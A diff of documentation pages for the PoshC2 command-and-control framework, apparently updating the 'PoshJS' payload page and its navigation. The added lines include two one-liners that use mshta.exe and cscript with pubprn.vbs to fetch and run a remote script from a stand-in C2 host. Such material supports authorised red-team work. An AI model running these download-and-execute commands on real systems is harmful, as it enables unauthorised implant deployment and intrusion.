@@ -99,11 +99,14 @@
 <li class="toctree-l2"><a class="reference internal" href="macro.html">Macro Documents</a></li>
 <li class="toctree-l2"><a class="reference internal" href="ms16-051.html">MS16-051 HTML File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="java.html">Java Applet</a></li>
-<li class="toctree-l2"><a class="reference internal" href="dll.html">Reflective Dll</a></li>
+<li class="toctree-l2"><a class="reference internal" href="dll.html">Reflective DLL</a></li>
 <li class="toctree-l2"><a class="reference internal" href="shellcode.html">Shellcode</a></li>
 <li class="toctree-l2 current"><a class="current reference internal" href="#">PoshJS</a></li>
 <li class="toctree-l2"><a class="reference internal" href="sctfiles.html">SCT Files</a></li>
-<li class="toctree-l2"><a class="reference internal" href="proxy.html">CreateProxyPaylods</a></li>
+<li class="toctree-l2"><a class="reference internal" href="regsvr32.html">RegSvr32</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cscript.html">Cscript</a></li>
+<li class="toctree-l2"><a class="reference internal" href="mshta.html">Mshta</a></li>
+<li class="toctree-l2"><a class="reference internal" href="certutil.html">Certutil</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../core/index.html">Core Implant / Features</a></li>
@@ -181,6 +184,13 @@
 <h1>PoshJS<a class="headerlink" href="#poshjs" title="Permalink to this headline">¶</a></h1>
 <p>Utilising <a class="reference external" href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>, PoshC2 creates a “Posh.js” file that can either be embedded into a HTA or called directly as a .js file. The tool generates JScript or VBScript that has a bootstrap which calls an arbitrary .NET Assembly and class, in this case the PoshC2 binary.</p>
 <p>In PoshC2 this is utilised in the one liners which are called by “cscript.exe”.</p>
+<p>NOTE: This does not work with untrusted SSL certificates if using over HTTPS:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">mshta</span><span class="o">.</span><span class="n">exe</span> <span class="n">vbscript</span><span class="p">:</span><span class="n">GetObject</span><span class="p">(</span><span class="s2">&quot;script:https://www.c2.com/news/j9hau_js&quot;</span><span class="p">)(</span><span class="n">window</span><span class="o">.</span><span class="n">close</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">cscript</span> <span class="o">/</span><span class="n">b</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">Printing_Admin_Scripts</span>\<span class="n">en</span><span class="o">-</span><span class="n">US</span>\<span class="n">pubprn</span><span class="o">.</span><span class="n">vbs</span> <span class="n">printers</span> <span class="s2">&quot;script:https://www.c2.com/news/j9hau_js&quot;</span>
+</pre></div>
+</div>
 </div>
 
 
